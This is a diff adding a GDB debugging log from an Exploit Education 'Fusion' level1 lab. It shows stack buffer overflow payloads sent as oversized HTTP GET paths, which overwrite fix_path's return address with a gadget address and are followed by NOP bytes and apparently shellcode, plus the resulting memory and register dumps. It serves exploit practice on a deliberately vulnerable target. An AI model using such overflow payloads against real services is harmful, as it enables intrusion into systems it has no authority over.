@@ -1,0 +1,1494 @@
+Reading symbols from /home/x90slide/exercises/exploit_education/fusion/level1/local/target...
+(No debugging symbols found in /home/x90slide/exercises/exploit_education/fusion/level1/local/target)
+0x08049d20 in _start ()
+warning: Error detected on fd 0
+error detected on stdin
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎ˛\|¡\ HTTP/1.1\ êêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêªD—›«Ÿt\$Ù\]1…±1\]É≈ﬂÔËêÒÅ˘¥ú\'w€—AJúÅ‘‰¢hfM§ãé˛jœf˝r–6àí\^–⁄ÕÆÿ,\^\|∫pÚRe†€¿7¿VåŒÊÊ9h
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffcab0 in ?? ()
+Undefined command: "exit".  Try "help".
+Reading symbols from /home/x90slide/exercises/exploit_education/fusion/level1/local/target...
+(No debugging symbols found in /home/x90slide/exercises/exploit_education/fusion/level1/local/target)
+0x08049d20 in _start ()
+Undefined command: "exit".  Try "help".
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Breakpoint 1 at 0x8049ecb
+The program is not being run.
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎ˛\|¡\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+0x08049ed1 in fix_path ()
+0x08049ed6 in fix_path ()
+0x08049edc in fix_path ()
+0x08049edf in fix_path ()
+0x08049ee5 in fix_path ()
+0x08049ee6 in fix_path ()
+0x08049ee9 in fix_path ()
+0x08049eee in fix_path ()
+0x08049ef1 in fix_path ()
+0x08049ef3 in fix_path ()
+0x08049ef5 in fix_path ()
+0x08049efa in fix_path ()
+0x08049f11 in fix_path ()
+0x08049f14 in fix_path ()
+0x08049f15 in fix_path ()
+Undefined command: "px".  Try "help".
+Item count other than 1 is meaningless in "print" command.
+Item count other than 1 is meaningless in "print" command.
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0xffffcb4c:	0x08049f25	0x00000000	0x00000000	0x20544547
+0xffffcb5c:	0x4141412f	0x41414141
+0xffffcb2c:	0x41414141	0x41414141	0x41414141	0xfeeb4141
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0xffffcb4c:	0x08049f25	0x00000000
+0xffffcb34:	0x41414141	0xfeeb4141	0x0807c17c	0xffffcb00
+0xffffcb44:	0x080b7061	0x00000008	0x08049f25	0x00000000
+0xffffcb54:	0x00000000	0x20544547
+Bottom (innermost) frame selected; you cannot go down.
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎ˛\|¡\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffcb40 in ?? ()
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎ˛\|¡\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+Breakpoint 2 at 0x8049f14
+Continuing.
+
+Breakpoint 2, 0x08049f14 in fix_path ()
+eax            0x1                 1
+ecx            0xffffca1c          -13796
+edx            0xffffffe0          -32
+ebx            0x41414141          1094795585
+esp            0xffffcab0          0xffffcab0
+ebp            0xffffcb38          0xffffcb38
+esi            0x80eb000           135180288
+edi            0x80481f0           134513136
+eip            0x8049f14           0x8049f14 <fix_path+77>
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+0xffffcab0:	0x4141412f	0x41414141	0x41414141	0x41414141
+0xffffcac0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcad0:	0x41414141	0x41414141
+0xffffcab0:	0x4141412f	0x41414141	0x41414141	0x41414141
+0xffffcac0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcad0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcae0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcaf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb10:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb30:	0x41414141	0x41414141	0xfeeb4141	0x0807c17c
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+0xffffcb50:	0x00000000	0x00000000	0x20544547	0x4141412f
+0xffffcb60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb80:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcb90:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcba0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbe0:	0x41414141	0xfeeb4141	0x0807c17c	0x54544800
+0xffffcab0:	0x4141412f	0x41414141	0x41414141	0x41414141
+0xffffcac0:	0x41414141	0x41414141	0x41414141	0x41414141
+Undefined info command: "esp".  Try "help info".
+Undefined info command: "$esp".  Try "help info".
+esp            0xffffcab0          0xffffcab0
+0xffffcab0:	0x4141412f	0x41414141	0x41414141	0x41414141
+0xffffcac0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcaac:	0x08049ed6	0x4141412f	0x41414141	0x41414141
+0xffffcabc:	0x41414141	0x41414141	0x41414141	0x41414141
+Undefined command: "next1".  Try "help".
+0x08049f15 in fix_path ()
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0xffffcb4c:	0x08049f25	0x00000000	0x00000000	0x20544547
+0xffffcb38:	0xfeeb4141	0x0807c17c	0xffffcb00	0x080b7061
+0xffffcb48:	0x00000008	0x08049f25	0x00000000	0x00000000
+0xffffcb38:	0x41	0x41	0xeb	0xfe	0x7c	0xc1	0x07	0x08
+0x0807c17c in _dl_get_tls_static_info ()
+Dump of assembler code for function _dl_get_tls_static_info:
+   0x0807c170 <+0>:	call   0x804a08a <__x86.get_pc_thunk.ax>
+   0x0807c175 <+5>:	add    eax,0x6ee8b
+   0x0807c17a <+10>:	mov    edx,0x80ec354
+   0x0807c180 <+16>:	mov    eax,0x80ec34c
+   0x0807c186 <+22>:	mov    ecx,DWORD PTR [edx]
+   0x0807c188 <+24>:	mov    edx,DWORD PTR [esp+0x4]
+   0x0807c18c <+28>:	mov    DWORD PTR [edx],ecx
+   0x0807c18e <+30>:	mov    edx,DWORD PTR [eax]
+   0x0807c190 <+32>:	mov    eax,DWORD PTR [esp+0x8]
+   0x0807c194 <+36>:	mov    DWORD PTR [eax],edx
+   0x0807c196 <+38>:	ret    
+End of assembler dump.
+eip            0x807c17c           0x807c17c <_dl_get_tls_static_info+12>
+Dump of assembler code for function _dl_get_tls_static_info:
+   0x0807c170 <+0>:	call   0x804a08a <__x86.get_pc_thunk.ax>
+   0x0807c175 <+5>:	add    eax,0x6ee8b
+   0x0807c17a <+10>:	mov    edx,0x80ec354
+   0x0807c180 <+16>:	mov    eax,0x80ec34c
+   0x0807c186 <+22>:	mov    ecx,DWORD PTR [edx]
+   0x0807c188 <+24>:	mov    edx,DWORD PTR [esp+0x4]
+   0x0807c18c <+28>:	mov    DWORD PTR [edx],ecx
+   0x0807c18e <+30>:	mov    edx,DWORD PTR [eax]
+   0x0807c190 <+32>:	mov    eax,DWORD PTR [esp+0x8]
+   0x0807c194 <+36>:	mov    DWORD PTR [eax],edx
+   0x0807c196 <+38>:	ret    
+End of assembler dump.
+Item count other than 1 is meaningless in "print" command.
+$1 = 0x807c17c
+0x807c17c <_dl_get_tls_static_info+12>:	0x54	0xc3	0x0e	0x08	0xc7	0xc0	0x4c	0xc3
+0x807c184 <_dl_get_tls_static_info+20>:	0x0e	0x08
+0x807c17c <_dl_get_tls_static_info+12>:	0x54	0xc3	0x0e	0x08	0xc7	0xc0	0x4c	0xc3
+0x807c184 <_dl_get_tls_static_info+20>:	0x0e	0x08	0x8b	0x0a	0x8b	0x54	0x24	0x04
+0x807c18c <_dl_get_tls_static_info+28>:	0x89	0x0a	0x8b	0x10	0x8b	0x44	0x24	0x08
+0x807c194 <_dl_get_tls_static_info+36>:	0x89	0x10	0xc3	0x8d	0xb4	0x26	0x00	0x00
+0x807c19c:	0x00	0x00	0x66	0x90	0x55	0x57	0x56	0x53
+0x807c1a4 <_dl_allocate_tls_storage+4>:	0xe8	0xc7	0xdb	0xfc	0xff	0x81	0xc3	0x57
+0x807c1ac <_dl_allocate_tls_storage+12>:	0xee	0x06	0x00	0x83	0xec	0x18	0xc7	0xc0
+0x807c1b4 <_dl_allocate_tls_storage+20>:	0x54	0xc3	0x0e	0x08	0x8b	0x38	0xc7	0xc0
+0x807c1bc <_dl_allocate_tls_storage+28>:	0x4c	0xc3	0x0e	0x08	0x8b	0x30	0x8d	0x44
+0x807c1c4 <_dl_allocate_tls_storage+36>:	0x37	0x04	0x50	0xe8	0x74	0x87	0xfe	0xff
+0x807c1cc <_dl_allocate_tls_storage+44>:	0x83	0xc4	0x10	0x85	0xc0	0x0f	0x84	0x91
+0x807c1d4 <_dl_allocate_tls_storage+52>:	0x00	0x00	0x00	0x89	0xc5	0x31	0xd2	0x8d
+0x807c1dc <_dl_allocate_tls_storage+60>:	0x44	0x30	0xff	0x83	0xec	0x08	0xf7	0xf6
+0x807c1e4 <_dl_allocate_tls_storage+68>:	0x0f	0xaf	0xc6	0x8d	0xb4	0x07	0xc0	0xfa
+0x807c1ec <_dl_allocate_tls_storage+76>:	0xff	0xff	0x31	0xc0	0x8d	0x7e	0x04	0x89
+0x807c1f4 <_dl_allocate_tls_storage+84>:	0xf1	0xc7	0x06	0x00	0x00	0x00	0x00	0xc7
+0x807c1fc <_dl_allocate_tls_storage+92>:	0x86	0x3c	0x05	0x00	0x00	0x00	0x00	0x00
+0x807c204 <_dl_allocate_tls_storage+100>:	0x00	0x83	0xe7	0xfc	0x29	0xf9	0x81	0xc1
+0x807c20c <_dl_allocate_tls_storage+108>:	0x40	0x05	0x00	0x00	0xc1	0xe9	0x02	0xf3
+0x807c214 <_dl_allocate_tls_storage+116>:	0xab	0xc7	0xc0	0x64	0xc3	0x0e	0x08	0x89
+0x807c21c <_dl_allocate_tls_storage+124>:	0xae	0x40	0x05	0x00	0x00	0x8b	0x00	0x6a
+0x807c224 <_dl_allocate_tls_storage+132>:	0x08	0x8d	0x78	0x0e	0x83	0xc0	0x10	0x50
+0x807c22c <_dl_allocate_tls_storage+140>:	0xe8	0x9f	0x94	0xfe	0xff	0x83	0xc4	0x10
+0x807c234 <_dl_allocate_tls_storage+148>:	0x85	0xc0	0x74	0x12	0x89	0x38	0x83	0xc0
+0x807c23c <_dl_allocate_tls_storage+156>:	0x08	0x89	0x46	0x04	0x83	0xc4	0x0c	0x89
+0x807c244 <_dl_allocate_tls_storage+164>:	0xf0	0x5b	0x5e	0x5f	0x5d	0xc3	0x83	0xec
+0x807c24c <_dl_allocate_tls_storage+172>:	0x0c	0x31	0xf6	0x55	0xe8	0x2b	0x8d	0xfe
+0x807c254 <_dl_allocate_tls_storage+180>:	0xff	0x83	0xc4	0x10	0x89	0xf0	0x83	0xc4
+0x807c25c <_dl_allocate_tls_storage+188>:	0x0c	0x5b	0x5e	0x5f	0x5d	0xc3	0x8d	0xb6
+0x807c264 <_dl_allocate_tls_storage+196>:	0x00	0x00	0x00	0x00	0x83	0xc4	0x0c	0x31
+0x807c26c <_dl_allocate_tls_storage+204>:	0xf6	0x5b	0x89	0xf0	0x5e	0x5f	0x5d	0xc3
+0x807c274:	0x8d	0xb4	0x26	0x00	0x00	0x00	0x00	0x8d
+0x807c27c:	0x74	0x26	0x00	0x90	0xe8	0x05	0xde	0xfc
+0x807c284 <_dl_allocate_tls_init+4>:	0xff	0x05	0x7b	0xed	0x06	0x00	0x55	0x57
+0x807c28c <_dl_allocate_tls_init+12>:	0x56	0x53	0x83	0xec	0x2c	0x8b	0x54	0x24
+0x807c294 <_dl_allocate_tls_init+20>:	0x40	0x89	0x44	0x24	0x18	0x85	0xd2	0x0f
+0x807c29c <_dl_allocate_tls_init+28>:	0x84	0x99	0x01	0x00	0x00	0x8b	0x74	0x24
+0x807c2a4 <_dl_allocate_tls_init+36>:	0x40	0xc7	0xc0	0x64
+0x807c17c <_dl_get_tls_static_info+12>:	0x54	0xc3	0x0e	0x08	0xc7	0xc0	0x4c	0xc3
+0x807c184 <_dl_get_tls_static_info+20>:	0x0e	0x08	0x8b	0x0a	0x8b	0x54	0x24	0x04
+0x807c18c <_dl_get_tls_static_info+28>:	0x89	0x0a	0x8b	0x10
+0x807c17c <_dl_get_tls_static_info+12>:	0x54	0xc3
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffcb40 in ?? ()
+0xffffcb40:	0x00	0xcb	0xff	0xff
+0xffffcb30:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcb38:	0x41	0x41	0xeb	0xfe	0x40	0xcb	0xff	0xff
+0xffffcb40:	0x00	0xcb	0xff	0xff
+0xffffcb3c:	0x40	0xcb	0xff	0xff	0x00	0xcb	0xff	0xff
+0xffffcb44:	0x61	0x70	0x0b	0x08	0x08	0x00	0x00	0x00
+0xffffcb4c:	0x25	0x9f	0x04	0x08
+0xffffcb3c:	0x40	0xcb	0xff	0xff
+No function contains specified address.
+No function contains specified address.
+Dump of assembler code from 0xffffcb40 to 0xffffcb42:
+=> 0xffffcb40:	add    bl,cl
+End of assembler dump.
+Dump of assembler code from 0xffffcb40 to 0xffffcb4a:
+=> 0xffffcb40:	add    bl,cl
+   0xffffcb42:	(bad)  
+   0xffffcb43:	jmp    DWORD PTR [ecx+0x70]
+   0xffffcb46:	or     ecx,DWORD PTR [eax]
+   0xffffcb48:	or     BYTE PTR [eax],al
+End of assembler dump.
+Dump of assembler code from 0xffffcb30 to 0xffffcb3a:
+   0xffffcb30:	inc    ecx
+   0xffffcb31:	inc    ecx
+   0xffffcb32:	inc    ecx
+   0xffffcb33:	inc    ecx
+   0xffffcb34:	inc    ecx
+   0xffffcb35:	inc    ecx
+   0xffffcb36:	inc    ecx
+   0xffffcb37:	inc    ecx
+   0xffffcb38:	inc    ecx
+   0xffffcb39:	inc    ecx
+End of assembler dump.
+0xffffcb40:	Undefined output format "q".
+0xffffcb40:	Undefined output format "q".
+0xffffcb40:	0xffffcb00
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+0xffffcb3c:	0xffffcb40	0xffffcb00	0x080b7061	0x00000008
+0xffffcb3f:	0xffcb00ff	0x0b7061ff	0x00000808	0x049f2500
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+0xffffcb3f:	0xffcb00ff	0x0b7061ff	0x00000808	0x049f2500
+0xffffcb3c:	0xffffcb40	0xffffcb00	0x080b7061	0x00000008
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+0xffffcb3c:	0xffffcb40	0xffffcb00	0x080b7061	0x00000008
+0xffffcb44:	0x080b7061	0x00000008	0x08049f25	0x00000000
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+0xffffcb44:	0x080b7061	0x00000008	0x08049f25	0x00000000
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎ˛\|¡\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Continuing.
+
+Breakpoint 2, 0x08049f14 in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+   0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+=> 0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+0x08049f15 in fix_path ()
+0x8049f15 <fix_path+78>:	0xe58955c3	0x14ec8153
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+   0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+=> 0x08049f15 <+78>:	ret    
+End of assembler dump.
+0x8049f15 <fix_path+78>:	0xe58955c3	0x14ec8153
+0x8049f15 <fix_path+78>:	0xe58955c3	0x14ec8153
+0x8049f15 <fix_path+78>:	0xe58955c3	0x14ec8153	0xe8000004	0xfffffe4b
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0xffffcb4c:	0x08049f25	0x00000000	0x00000000	0x20544547
+0xffffcb38:	0xfeeb4141	0x0807c17c	0xffffcb00	0x080b7061
+0xffffcb48:	0x00000008	0x08049f25	0x00000000	0x00000000
+0xffffcb2c:	0x41414141	0x41414141	0x41414141	0xfeeb4141
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0x0807c17c in _dl_get_tls_static_info ()
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffcb2c:	0x41414141	0x41414141	0x41414141	0xfeeb4141
+0xffffcb3c:	0xffffcb40	0xffffcb00	0x080b7061	0x00000008
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÎ˛\|¡\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Continuing.
+
+Breakpoint 2, 0x08049f14 in fix_path ()
+0x08049f15 in fix_path ()
+0xffffcb2c:	0x41414141	0x41414141	0x41414141	0xfeeb4141
+0xffffcb3c:	0x0807c17c	0xffffcb00	0x080b7061	0x00000008
+0x0807c17c in _dl_get_tls_static_info ()
+0xffffcb30:	0x41414141	0x41414141	0xfeeb4141	0x0807c17c
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffcb2c:	0x41414141	0x41414141	0x41414141	0xfeeb4141
+0xffffcb3c:	0xffffcb40	0xffffcb00	0x080b7061	0x00000008
+0xffffcb40 in ?? ()
+0xffffcb30:	0x41414141	0x41414141	0xfeeb4141	0xffffcb40
+0xffffcb40:	0xffffcb00	0x080b7061	0x00000008	0x08049f25
+warning: Error detected on fd 0
+error detected on stdin
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Breakpoint 1 at 0x8049ecb
+The program is not being run.
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡BBBBBBBB\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+Quit
+Breakpoint 2 at 0x8049f15
+Continuing.
+
+Breakpoint 2, 0x08049f15 in fix_path ()
+0xffffcb2c:	0x0807c17c
+0x0807c17c in _dl_get_tls_static_info ()
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffcb30 in ?? ()
+0xffffcb30:	0x42424242
+0xffffcb30:	0x42424242	0x42424242	0x00000000	0x08049f25
+0xffffcb2c:	0xffffcb30	0x42424242	0x42424242	0x00000000
+0xffffcb28:	0x41414141	0xffffcb30	0x42424242	0x42424242
+No function contains program counter for selected frame.
+No function contains specified address.
+Dump of assembler code from 0xffffcb30 to 0xffffcb3a:
+=> 0xffffcb30:	inc    edx
+   0xffffcb31:	inc    edx
+   0xffffcb32:	inc    edx
+   0xffffcb33:	inc    edx
+   0xffffcb34:	inc    edx
+   0xffffcb35:	inc    edx
+   0xffffcb36:	inc    edx
+   0xffffcb37:	inc    edx
+   0xffffcb38:	add    BYTE PTR [eax],al
+End of assembler dump.
+Undefined command: "exit".  Try "help".
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Undefined command: "exit".  Try "help".
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Breakpoint 1 at 0x8049ecb
+The program is not being run.
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡êêêêêêêêÎ˛Î˛\ HTTP/1.1
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
